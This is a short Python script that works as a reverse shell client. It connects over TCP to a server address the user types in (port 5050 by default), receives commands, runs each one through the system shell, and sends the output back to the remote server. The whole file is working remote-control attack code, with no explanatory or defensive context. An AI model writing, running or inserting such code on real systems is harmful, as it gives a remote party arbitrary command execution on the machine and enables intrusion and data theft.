import socket
import subprocess

def connect_to_server(server_ip='127.0.0.1', port=5050):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
        print("[+] Connected to server.")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    while True:
        try:
            command = client.recv(4096).decode()
            if not command or command.lower() == "exit":
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            if not output:
                output = b"[+] Command executed with no output."
            client.send(output)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    client.close()

if __name__ == "__main__":
    ip = input("Enter server IP: ")
    connect_to_server(server_ip=ip)
